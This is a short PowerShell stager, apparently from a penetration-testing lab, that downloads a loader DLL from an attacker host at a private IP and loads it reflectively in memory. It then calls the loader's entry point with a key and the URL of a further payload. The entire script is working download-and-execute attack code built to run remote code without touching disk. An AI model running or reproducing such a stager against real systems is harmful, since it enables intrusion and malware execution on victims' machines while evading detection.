$KALI_IP     = "192.168.1.69"
$PAYLOAD_KEY = "lab2026"
$LOADER_URL  = "http://" + $KALI_IP + ":8000/FinalLoaderV4.dll"
$PAYLOAD_URL = "http://" + $KALI_IP + ":8000/payload.bin"

$wc    = New-Object Net.WebClient
$bytes = $wc.DownloadData($LOADER_URL)
$asm   = [System.Reflection.Assembly]::Load($bytes)
$t     = $asm.GetType("FinalLoaderV4.Program")
$m     = $t.GetMethod("Main", [System.Reflection.BindingFlags]"Static,Public,NonPublic")
$m.Invoke($null, (, [string[]]@($PAYLOAD_KEY, $PAYLOAD_URL, $PAYLOAD_KEY)))
